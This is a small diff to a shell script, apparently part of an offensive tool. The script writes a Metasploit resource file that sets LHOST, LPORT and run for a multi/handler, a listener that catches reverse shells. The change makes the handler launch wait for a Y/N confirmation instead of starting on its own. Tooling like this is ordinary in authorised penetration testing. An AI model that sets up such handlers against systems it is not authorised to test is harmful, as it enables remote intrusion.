@@ -80,4 +80,11 @@ echo "set LHOST $ip" >> meta.rc
 echo "set LPORT $port" >> meta.rc
 echo "run" >> meta.rc
 
-msfconsole -r meta.rc
+echo 'Do you want to start metasploit multi/handler? (Y/N)'
+read choice
+if [[ "$choice" == "y" || "$choice" == "Y" ]]; then 
+        msfconsole -r meta.rc
+else 
+        echo '================Exiting================'
+        exit 1
+fi
